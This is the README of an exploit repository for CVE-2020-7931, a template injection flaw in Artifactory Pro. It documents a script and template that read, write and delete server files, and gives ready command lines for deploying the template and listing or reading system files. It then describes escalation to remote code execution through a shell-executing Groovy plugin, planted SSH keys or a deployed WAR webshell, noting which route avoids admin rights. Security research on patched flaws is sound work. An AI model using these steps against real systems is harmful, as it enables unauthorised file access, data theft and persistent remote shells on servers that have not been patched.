CVE-2020-7931: SSTI exploitation in Artifactory Pro
===================================================

CVE-2020-7931 is somewhat of a purposeful misconfiguration vulnerability in Artifactory that lets attackers conduct [server-side template injections](https://portswigger.net/kb/issues/00101080_server-side-template-injection) from a [FreeMarker template](https://freemarker.apache.org/).

The vulnerability was discovered by [Ryan Hanson from Atredis](https://github.com/atredispartners/advisories/blob/master/ATREDIS-2019-0006.md) and was fixed for all affected versions in late 2019. It will only work on the Pro versions of Artifactory, as other versions do not have templating capabilities.

This repository contains a [script](./artifactory_CVE-2020-7931.py) and a [template](./sample.xml).

* The python script is a wrapper to automate the uploading, deployment and execution of template payloads.
* The template implements many primitives (read, list, write...) that interact with the filesystem and lead to Remote Code Execution.


Template contents
-----------------

The template grabs the first GET parameter to determine its desired action. Valid actions are:
```
info                                    Returns info about the current configuration
read <filepath>                         Reads a file, as is
read_bytes <filepath>                   Reads a file binarily as integers
list <dirpath>                          List a directory contents
create_file <filepath>                  Create an empty file
mkdir <dirpath>                         Create a folder
delete <filepath>                       Delete a file or empty folder
move <src> <dst>                        Move a file (*)
copy <scr_path> <src_file> <dst>        Copy a file to the application's web root. Pay attention to the quirky arguments (**)
```

(\*): move uses the Java [renameTo method](https://docs.oracle.com/javase/7/docs/api/java/io/File.html#renameTo(java.io.File)) which does not work accross different filesystems. To perform a move accross filesystems, copy then move have to be used, more info below.

(\*\*): source has to be split between the basepath and the filename; destination is relative to artifactory's web application root path, e.g. ```/opt/jfrog/artifactory/tomcat/webapps/artifactory/```


Script usage
------------
```
usage: artifactory_CVE-2020-7931.py [-h] -H HOST [-u USER] [-p PASSWORD]
                                    [-c COOKIE] [-U UPLOAD] [-g]
                                    [-d DROP_TEMPLATE] [-e EXEC_TEMPLATE] [-r]
                                    [-R REPOSITORY_NAME]

optional arguments:
  -h, --help            show this help message and exit
  -H HOST, --host HOST
  -u USER, --user USER
  -p PASSWORD, --password PASSWORD
  -c COOKIE, --cookie COOKIE
  -U UPLOAD, --upload UPLOAD
  -g, --get_cookie
  -d DROP_TEMPLATE, --drop_template DROP_TEMPLATE
  -e EXEC_TEMPLATE, --exec_template EXEC_TEMPLATE
  -r, --reload_plugins
  -R REPOSITORY_NAME, --repository_name REPOSITORY_NAME
                        Default: example-repo-local
```

### Getting and setting a cookie
```
export cookie=$(./artifactory_CVE-2020-7931.py -H http://localhost:8081 -g -u admin -p password | grep '-') && echo $cookie
```

### Uploading a file
```
./artifactory_CVE-2020-7931.py -H http://localhost:8081/ -c $cookie -U sample.groovy
```

### Deploying the template
```
./artifactory_CVE-2020-7931.py -H http://localhost:8081/ -c $cookie -d sample.xml
```

### Executing the template
```
./artifactory_CVE-2020-7931.py -H http://localhost:8081/ -c $cookie -e sample.xml list /etc/
./artifactory_CVE-2020-7931.py -H http://localhost:8081/ -c $cookie -e sample.xml read /etc/password
```

### Copying a file accross mountpoints
As we've seen, renameTo() will not work accross different filesystems. To emulate this, first copy the file then move it (do it immediately, or else artifactory might crash!):
```
./artifactory_CVE-2020-7931.py -H http://localhost:8081/ -c $cookie -e sample.xml copy /var/opt/jfrog/artifactory/data/tmp/artifactory-uploads/ bla /bla (***)
./artifactory_CVE-2020-7931.py -H http://localhost:8081/ -c $cookie -e sample.xml move /opt/jfrog/artifactory/tomcat/webapps/artifactory/bla /etc/bla
```

(\*\*\*): As explained previously, here ```/bla``` actually refers to ```/opt/jfrog/artifactory/tomcat/webapps/artifactory/bla``` because ```root.write()``` will necessarily write to the current application's web root.

This lets you exploit configurations that are storing artifacts on a separate filesystem (which is a sound practice!).


Getting Remote Code Execution
-----------------------------
By default with an artifactory install, it's not possible to instantiate classes, thus the [regular freemarker.template.utility.Execute trick](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#code-execution-2) will not work.

There are several other ways to get remote code execution just by manipulating the filesystem:

* adding a public key to the users's authorized_keys file, which might not work for a number of reasons (maybe there's no SSH, maybe it has no PubKey authentication, maybe it's configured to look in /etc/ssh/authorized_keys rather than in user's homes ...)
* executing a groovy plugin
* starting a Tomcat servlet that implements a webshell


### Executing a groovy plugin
Here's an example of a groovy plugin that performs shell execution, [more elaborate examples here](https://github.com/gquere/pwn_jenkins#command-execution-from-groovy):
```
def proc = "ls -la /etc".execute();
def os = new StringBuffer();
proc.waitForProcessOutput(os, System.err);
println(os.toString());
```

Plugins have to be placed in the plugin path ```/var/opt/jfrog/artifactory/etc/plugins/``` and have to be reloaded by using an [API call](https://www.jfrog.com/confluence/display/JFROG/Artifactory+REST+API#ArtifactoryRESTAPI-ReloadPlugins) that requires **Artifactory admin privileges**:
```
./artifactory_CVE-2020-7931.py -H http://localhost:8081/ -c $cookie -r
```


### Starting a Tomcat servlet (deploying a .war file)
Here's a [Tomcat servlet](https://github.com/gquere/javaWebShell) that implements a webshell.

WAR files have to be placed in Tomcat webapps path ```/opt/jfrog/artifactory/tomcat/webapps/```. By default, deployment of WAR files is automatic and will start another web application next to the Artifactory instance, e.g. at ```http://localhost:8081/sample/```.

This is the preferred method as it does not require Artifactory admin privileges and it's just simpler to execute commands on the fly.
